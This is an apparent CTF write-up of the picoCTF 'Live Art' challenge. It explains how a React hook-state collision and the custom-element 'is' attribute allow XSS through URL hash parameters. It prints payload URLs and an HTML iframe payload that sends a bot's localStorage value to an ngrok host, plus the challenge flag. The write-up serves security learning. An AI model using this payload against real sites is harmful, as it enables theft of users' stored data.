---
title: 'Live Art'
target: 'picoCTF — Live Art'
difficulty: 'hard'
date: 2026-07-22
summary: "A picoCTF Web Exploitation challenge where a React drawing app conditionally rendered a viewer or error page based on window width, and a state-management bug during the re-render allowed injecting arbitrary attributes into an img tag via URL hash parameters, achieving XSS through React's custom element bypass."
role: 'appsec'
tags: ['web-exploitation', 'xss', 'react', 'custom-elements', 'puppeteer', 'iframe', 'picoctf']
problem: "A live drawing application built with React where a Puppeteer bot stores the flag in its browser's localStorage. The bot visits URLs submitted through a fan-mail form, but the React app sanitises attributes and the XSS vector requires exploiting a state-management quirk in the app's conditional rendering."
action: "Ran the client source locally to understand the React component structure, discovered that the /drawing page conditionally rendered a viewer or error page based on window width, identified a state variable collision between the error page's URL hash params and the viewer's dimensions prop during a dynamic re-render, used the is attribute to force React to treat the img tag as a custom element (bypassing attribute sanitisation), then delivered the XSS payload through an iframe resize trick hosted on ngrok."
outcome: "Exfiltrated the flag from the bot's localStorage by triggering the XSS inside an iframe that the bot loaded through the fan-mail feature."
draft: false
---

## Background

Live Art is a picoCTF Web Exploitation challenge about a React-based drawing application where users can create artwork and share it with viewers. The challenge description reads "There's nothing quite as fun as drawing for an audience. So sign up for LiveArt today and show the world what you can do." A Puppeteer bot visits URLs submitted through a fan-mail form, and the flag is stored in the bot's `localStorage`. The exploit requires understanding a subtle state-management bug in React's conditional rendering, combined with a custom element bypass to inject event handlers into a sanitised img tag, all delivered through an iframe resize trick because the bot's browser window cannot be manually resized.

---

## Exploring the source code

The application source was available for local analysis, and running the client locally revealed the key components. The most interesting code was in the hooks and drawing modules.

The `useHashParams` hook parsed key-value pairs from the URL hash fragment and returned them as a `Record<string, string>` object:

```typescript
const getHashParams = <T extends Record<string, string>>() => {
  const params = new URLSearchParams(window.location.hash.substring(1));
  const result = Object.create(null);

  params.forEach((value, key) => {
    result[key] = value;
  });

  return result as T;
};
```

This was significant because a `Record<string, string>` object could be spread directly into a JSX element as attributes. For example, `{height: "200", width: "200"}` spread into `<div {...record} />` would produce `<div height="200" width="200"></div>`. If the hash parameters could be injected into an HTML element, they could set any attribute — including event handlers like `onerror`.

The `useHashParams` hook was used in the `error.tsx` page, which displayed error messages. The question was how to get those hash parameters into a context where they would be applied to an element that could trigger JavaScript execution.

---

## The conditional rendering bug

The `/drawing` page had a conditional rendering pattern based on window width:

```typescript
const isWideEnough = () => window.innerWidth > 600;

const _Drawing = (props: Props) => {
    const [image, setImage] = React.useState<string | undefined>();
    const [bigEnough, setBigEnough] = React.useState(isWideEnough());

    // ...resize listener updates bigEnough state...

    const view = bigEnough
        ? getWrappedViewer({ image })
        : getWrappedError({ error: "Please make your window bigger" });

    return (
        <div>
            { view }
        </div>
    );
};
```

If the window was wider than 600 pixels, it rendered the `Viewer` component. If it was narrower, it rendered the `ErrorPage` component. The resize listener called `isWideEnough()` asynchronously and updated the state, so the component would dynamically switch between the two views when the window was resized.

The Viewer component had a state variable called `dimensions` that was spread into an img tag:

```jsx
<img src={props.image} { ...dimensions }/>
```

This was the injection target — if `dimensions` could be controlled, any attributes could be set on the img element.

---

## The state collision

The critical bug emerged from what happened when the page loaded in a narrow window and was then resized wider. When `/drawing` loaded in a narrow window, React rendered the `ErrorPage` component first. The `ErrorPage` ran `useHashParams`, which called `React.useState()` with the parsed URL hash parameters. React's hooks system associated this state with the component's hook slot at position zero.

When the window was then resized wider than 600 pixels, React re-rendered the component and switched to the `Viewer` component. But the Viewer's first `useState` hook — the one for `dimensions` — occupied the same hook slot (position zero) that `useHashParams` had just populated with the URL hash parameters. Because React tracks hook state by call order within a component, the `dimensions` state variable inherited the values that the error page's hash params hook had stored.

This meant that whatever key-value pairs were in the URL hash fragment became the attributes of the img tag in the Viewer. Opening `/drawing/pwn#height=500&width=500` in a narrow window and then expanding it would produce `<img height="500" width="500" />`.

The "Viewing" page after triggering the resize showed the bugged state — the heading rendered but the img element was empty because no image data had been passed through the peer connection, and the dimensions from the hash params were applied as attributes.

![DevTools Elements tab showing the "Viewing" page with an h1 element containing "Viewing" and an img element highlighted in a red box below it. The page-content div is visible in the DOM tree, and the img tag sits inside nested div elements. The page has a pink pixelated logo in the top right corner and the heading "Viewing" centred on a dark background.](/writeups/picoctf-live-art/05.png)

---

## Bypassing React's attribute sanitisation

The hash parameters could inject arbitrary attributes into the img tag, but React normally sanitises event handler attributes like `onerror` — it strips them from regular HTML elements to prevent XSS. The bypass was React's custom element support. When an element has an `is` attribute, React treats it as a custom element and passes all attributes through without sanitisation, including event handlers.

Adding `is` (with no value) to the hash parameters alongside `onerror` and `src=none` produced a working XSS. The URL `http://saturn.picoctf.net:63756/drawing/pwn#src=none&onerror=alert("pwn")&is` loaded the error page in a narrow window, and when the window was expanded, the Viewer rendered with `<img src="none" onerror="alert('pwn')" is />` — the image failed to load and the `onerror` handler executed.

---

## Building the exfiltration payload

The Puppeteer bot opened URLs submitted through the `/fan-mail` form. The flag was stored in the bot's `localStorage.username`. The bot's browser window had a fixed size that could not be resized manually, so the narrow-then-wide trick had to be automated using iframes — an iframe could be created at a narrow width to trigger the error page render, then programmatically widened to trigger the re-render and XSS.

The bot only accepted `http://` and `https://` URLs, so the payload HTML had to be hosted on a publicly accessible server. Set up a local Python HTTP server with `python3 -m http.server` on port 8000 and exposed it through ngrok to get a public URL.

![Terminal split into two sections. The top section shows a command running python3 -m http.server with output "Serving HTTP on 0.0.0.0 port 8000" and a file listing showing index.html (1 KB). The bottom section shows ngrok by @inconshreveable with Session Status online, Version 2.3.40, Region United States, and Forwarding URLs mapping the ngrok subdomain to http://localhost:8000.](/writeups/picoctf-live-art/06.png)

The `index.html` payload performed three steps in sequence. First, it created an iframe at default width (narrow enough to trigger the error page) pointing to a dummy source, and stored the exfiltration command in `frame.contentWindow.name` as a string — `window.open('<ngrok-url>' + localStorage.username)` — which would not execute until explicitly passed to `eval()`. Second, after a short delay, it set the iframe's source to the XSS URL: `http://localhost:4000/drawing/pwn#onerror=eval(window.name)&src=pwn&is=notpwn`. The `onerror` handler used `eval(window.name)` to execute the stored exfiltration command, keeping the payload compact and avoiding character escaping issues in the URL hash. Third, after another delay, it increased the iframe's width to 1000 pixels, which triggered `isWideEnough()`, caused the re-render from error page to viewer, and fired the XSS through the img tag's `onerror` handler:

```html
<iframe src="none" id=frame height="1000"></iframe>
<script>
  frame.contentWindow.name = `window.open('${location.href}'+localStorage.username)`
  frame.onload = () => {
    setTimeout(`frame.contentWindow.location = 'http://localhost:4000/drawing/pwn#onerror=eval(window.name)&src=pwn&is=notpwn'`, 1000)
    setTimeout(`frame.width = 1000`, 1500)
  }
</script>
```

The `location.href` in the stored command resolved to the ngrok URL (since the payload HTML was hosted there), so when the XSS fired, it opened a new window to `<ngrok-url>/<flag-value>`, which appeared as a request in the ngrok logs.

---

## Getting the flag

Submitted the ngrok URL through the fan-mail form. The bot loaded the payload, which created the narrow iframe, set the drawing URL, expanded the iframe, and the XSS fired — reading `localStorage.username` and opening a window to the ngrok URL with the flag appended as the path. The flag appeared in the server logs.

`picoCTF{beam_me_up_reacty_90b651ae}`

---

## What I took from this

This challenge demonstrated that client-side framework features can introduce unexpected attack surfaces that go beyond traditional XSS. The core vulnerability was not a missing sanitisation function or an unescaped output — it was a state-management bug in React's hooks system, where conditional rendering caused state from one component to leak into another through hook slot reuse. React's own attribute sanitisation would have prevented the XSS if not for the custom element bypass via the `is` attribute, which is a documented behaviour that developers rarely consider in a security context. The iframe resize trick showed that browser-level constraints (like a fixed window size) can often be circumvented by nesting contexts — an iframe is its own viewport with independently controllable dimensions. The use of `window.name` as a cross-navigation data channel was another subtle technique: unlike most DOM properties, `window.name` persists across page navigations within the same window or iframe, making it a reliable way to smuggle data into a new page context. The takeaway is that modern web applications built on frameworks like React are not immune to XSS — the attack surface shifts from template injection to framework-specific quirks in state management, attribute handling, and component lifecycle behaviour.
